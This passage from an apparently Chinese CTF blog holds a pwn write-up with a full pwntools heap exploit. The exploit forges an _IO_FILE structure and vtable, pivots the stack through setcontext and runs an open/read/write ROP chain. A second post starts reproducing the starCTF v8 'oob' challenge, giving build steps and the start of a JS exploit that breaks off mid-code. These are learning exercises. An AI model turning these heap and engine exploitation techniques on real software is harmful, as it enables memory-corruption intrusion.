<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">heap_b = heap_base + <span class="number">0x470</span> + <span class="number">0x10</span></span><br><span class="line">heap_a = heap_base + <span class="number">0x560</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xe0</span>, p64(heap_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x0000000000001b92</span></span><br><span class="line"></span><br><span class="line">fake_io_struct = p64(<span class="number">0xfbda2008</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> \</span><br><span class="line">    + p64(<span class="number">1</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">3</span> \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_b) \    </span><br><span class="line">    + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) \</span><br><span class="line">    + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) + p64(heap_b+<span class="number">0x48</span>)  \</span><br><span class="line">    + p64(libc.sym[<span class="string">'open'</span>]) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(heap_base+<span class="number">0x80</span><span class="number">-0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa</span>, <span class="number">0xe0</span>, fake_io_struct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">'flag\x00\x00\x00\x00'</span> + p64(heap_b) + p64(<span class="number">0</span>)</span><br><span class="line">ropchain = ropchain.ljust(<span class="number">0xa0</span><span class="number">-0x60</span>, <span class="string">'\x00'</span>)</span><br><span class="line">ropchain += p64(<span class="number">0</span>)</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'read'</span>])</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'write'</span>])</span><br><span class="line">add(<span class="number">0xb</span>, <span class="number">0xe0</span>, ropchain)</span><br></pre></td></tr></table></figure>

<p>覆盖<code>_IO_FILE</code>的<code>_chain</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_vtable = p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_base+<span class="number">0x93</span>)[<span class="number">3</span>:] \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>) * <span class="number">6</span> \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>+<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_a)</span><br><span class="line">    <span class="comment">#+ p64(3) + p64(0) * 2 + p64(heap_base+0xf0) \</span></span><br><span class="line">    <span class="comment">#+ p64(0xffffffffffffffff) + p64(0) + p64(heap_base+0x100)  \</span></span><br><span class="line">    <span class="comment">#+ p64(0) * 6 + 'aaaaaaaa'</span></span><br><span class="line">add(<span class="number">0xd</span>, <span class="number">0xe0</span>, payload + fake_vtable)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// libc.sym['setcontext']+53</span></span><br><span class="line">&lt;setcontext+<span class="number">53</span>&gt;:   mov    rsp,QWORD PTR [rdi+<span class="number">0xa0</span>]</span><br><span class="line">&lt;setcontext+<span class="number">60</span>&gt;:   mov    rbx,QWORD PTR [rdi+<span class="number">0x80</span>]</span><br><span class="line">&lt;setcontext+<span class="number">67</span>&gt;:   mov    rbp,QWORD PTR [rdi+<span class="number">0x78</span>]</span><br><span class="line">&lt;setcontext+<span class="number">71</span>&gt;:   mov    r12,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">&lt;setcontext+<span class="number">75</span>&gt;:   mov    r13,QWORD PTR [rdi+<span class="number">0x50</span>]</span><br><span class="line">&lt;setcontext+<span class="number">79</span>&gt;:   mov    r14,QWORD PTR [rdi+<span class="number">0x58</span>]</span><br><span class="line">&lt;setcontext+<span class="number">83</span>&gt;:   mov    r15,QWORD PTR [rdi+<span class="number">0x60</span>]</span><br><span class="line">&lt;setcontext+<span class="number">87</span>&gt;:   mov    rcx,QWORD PTR [rdi+<span class="number">0xa8</span>]</span><br><span class="line">&lt;setcontext+<span class="number">94</span>&gt;:   push   rcx</span><br><span class="line">&lt;setcontext+<span class="number">95</span>&gt;:   mov    rsi,QWORD PTR [rdi+<span class="number">0x70</span>]</span><br><span class="line">&lt;setcontext+<span class="number">99</span>&gt;:   mov    rdx,QWORD PTR [rdi+<span class="number">0x88</span>]</span><br><span class="line">&lt;setcontext+<span class="number">106</span>&gt;:  mov    rcx,QWORD PTR [rdi+<span class="number">0x98</span>]</span><br><span class="line">&lt;setcontext+<span class="number">113</span>&gt;:  mov    r8,QWORD PTR [rdi+<span class="number">0x28</span>]</span><br><span class="line">&lt;setcontext+<span class="number">117</span>&gt;:  mov    r9,QWORD PTR [rdi+<span class="number">0x30</span>]</span><br><span class="line">&lt;setcontext+<span class="number">121</span>&gt;:  mov    rdi,QWORD PTR [rdi+<span class="number">0x68</span>]</span><br><span class="line">&lt;setcontext+<span class="number">125</span>&gt;:  xor    eax,eax</span><br><span class="line">&lt;setcontext+<span class="number">127</span>&gt;:  ret</span><br></pre></td></tr></table></figure>

<p>由于执行vtable中的函数的时候，会把<code>_IO_FILE</code>结构体指针当作第一个参数，所以将<code>fake_io_struct</code>构造好之后，就可以让栈迁移到堆上，然后执行我们的ROP链最后读出flag</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ hex(y))</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'input your size:\n'</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'input your context:'</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">'abc'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xe0</span>, <span class="string">'abc'</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xe0</span>, <span class="string">'abc'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">heap_base = u64(ru(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &amp; ~<span class="number">0xfff</span></span><br><span class="line">success(<span class="string">'heap base:'</span>, heap_base)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">leak = u64(ru(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'leak:'</span>, leak)</span><br><span class="line">libc.address = leak - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">'libc base'</span>, libc.address)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) \</span><br><span class="line">    + <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x1a0</span>, payload)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x1a0</span>, <span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(leak)+p64(leak + <span class="number">0x1c70</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x80</span>, <span class="string">'abc'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_addr = heap_base + <span class="number">0x13</span> - <span class="number">0x8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_b = heap_base + <span class="number">0x470</span> + <span class="number">0x10</span></span><br><span class="line">heap_a = heap_base + <span class="number">0x560</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xe0</span>, p64(heap_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x0000000000001b92</span></span><br><span class="line"></span><br><span class="line">fake_vtable = p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)</span><br><span class="line">fake_io_struct = p64(<span class="number">0xfbda2008</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> \</span><br><span class="line">    + p64(<span class="number">1</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">3</span> \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_b) \</span><br><span class="line">    + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) \</span><br><span class="line">    + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) + p64(heap_b+<span class="number">0x48</span>)  \</span><br><span class="line">    + p64(libc.sym[<span class="string">'open'</span>]) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(heap_base+<span class="number">0x80</span><span class="number">-0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa</span>, <span class="number">0xe0</span>, fake_io_struct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">'flag\x00\x00\x00\x00'</span> + p64(heap_b) + p64(<span class="number">0</span>)</span><br><span class="line">ropchain = ropchain.ljust(<span class="number">0xa0</span><span class="number">-0x60</span>, <span class="string">'\x00'</span>)</span><br><span class="line">ropchain += p64(<span class="number">0</span>)</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'read'</span>])</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'write'</span>])</span><br><span class="line">add(<span class="number">0xb</span>, <span class="number">0xe0</span>, ropchain)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_base+<span class="number">0x93</span>)[<span class="number">3</span>:] \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>) * <span class="number">6</span> \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>+<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_a)</span><br><span class="line">    <span class="comment">#+ p64(3) + p64(0) * 2 + p64(heap_base+0xf0) \</span></span><br><span class="line">    <span class="comment">#+ p64(0xffffffffffffffff) + p64(0) + p64(heap_base+0x100)  \</span></span><br><span class="line">    <span class="comment">#+ p64(0) * 6 + 'aaaaaaaa'</span></span><br><span class="line">add(<span class="number">0xd</span>, <span class="number">0xe0</span>, payload + fake_vtable)</span><br><span class="line">sl(<span class="string">'5'</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题挺好的，学到了新姿势，同时又更加佩服那些当场做出题的师傅们</p>
<p>这里主要是偏移不好算，而且还有更加简单一点的办法，就是直接覆盖<code>_IO_list_all</code>指向的那个<code>_IO_FILE</code>即第一个块的vtable，然后就有更多的空间来布置vtable和ropchain了，不像我似的，东拼西凑出来的空间</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[starCTF oob复现]]></title>
      <url>/2019/10/18/starCTF-oob%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<p>自从数字经济2019线下赛之后，体验了一把小白难度的Real World，虽然一道题没出来，但是至少给学习带来了前进的方向</p>
<p>遂想要复现当时赛场的一道chrome的题目，于是着手开始学习v8的利用</p>
<p>starCTF 的 oob很简单，是个不错的选择</p>
<a id="more"></a>

<p>参考：<a href="https://www.freebuf.com/vuls/203721.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/203721.html</a></p>
<p>建议先把大佬的文章看完，然后本文权当补充以及自我总结</p>
<h1 id="下载编译v8"><a href="#下载编译v8" class="headerlink" title="下载编译v8"></a>下载编译v8</h1><p>因为墙的缘故，下载v8会很烦人。在我感叹利用朋友搭的VPS也不能在国内愉快地下载v8的源码的时候，不得已买了个vpn，我才发现，原来下载慢只是钱不到位</p>
<h2 id="下载depot-tools"><a href="#下载depot-tools" class="headerlink" title="下载depot_tools"></a>下载depot_tools</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="meta">$</span> echo 'export PATH=$PATH:"/path/to/depot_tools"' &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>

<h2 id="下载V8"><a href="#下载V8" class="headerlink" title="下载V8"></a>下载V8</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> fetch v8</span><br><span class="line"><span class="meta">$</span> gclient sync</span><br></pre></td></tr></table></figure>

<h2 id="安装所需依赖"><a href="#安装所需依赖" class="headerlink" title="安装所需依赖"></a>安装所需依赖</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd v8</span><br><span class="line"><span class="meta">$</span> build/install-build-deps.sh</span><br></pre></td></tr></table></figure>

<h2 id="导入gdb脚本"><a href="#导入gdb脚本" class="headerlink" title="导入gdb脚本"></a>导入gdb脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ #在 ~/.gdbinit 中添加</span><br><span class="line">$ source /path/to/v8/tools/gdbinit</span><br><span class="line">$ source /path/to/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>通常的教程的编译过程是这样的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> tools/dev/v8gen.py x64.release</span><br><span class="line"><span class="meta">$</span> #release版本</span><br><span class="line"><span class="meta">$</span> ninja -C out.gn/x64.release d8</span><br><span class="line"><span class="meta">$</span> #debug版本</span><br><span class="line"><span class="meta">$</span> ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure>

<p>此法不管release版本还是debug版本都不适合做题，因为release版本无法使用v8的指令，而debug版本在运行漏洞函数的时候会因为dcheck而报错终止。解决办法就是设置好编译选项，或者干掉dcheck的宏（我没成功）</p>
<p>于是我找到了另一种方法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure>

<p>gm.py脚本中定义了一些编译选项，我发现它们刚好可以符合外面的要求，即在release版本中使用它定义的一些gdb指令</p>
<h1 id="关于debug"><a href="#关于debug" class="headerlink" title="关于debug"></a>关于debug</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> path/to/d8 --allow-natives-syntax path/to/js</span><br></pre></td></tr></table></figure>

<p>输入 <code>--allow-natives-syntax</code>参数可以使用v8的一些调试函数，作为新手，我接触到的有</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>函数作用顾名思义</p>
<h1 id="关于exp"><a href="#关于exp" class="headerlink" title="关于exp"></a>关于exp</h1><h2 id="寻常方法"><a href="#寻常方法" class="headerlink" title="寻常方法"></a>寻常方法</h2><p>在本文开始的链接中，作者共介绍了两种方法，一种是寻常pwn题的思路，即读取got地址，读出libc地址，算出libc函数地址，最后覆盖<code>__free_hook</code>或者<code>__malloc_hook</code></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>该exp对应的偏移均是在<code>out.gn/x64.release/d8</code>中计算的偏移，即通常编译过程的release版本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf)</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">n</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>:<span class="number">1.1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatMap = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> objMap = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj;</span><br><span class="line">    objArray.oob(floatMap);</span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>]) - <span class="number">1</span>n;</span><br><span class="line">    objArray.oob(objMap);</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 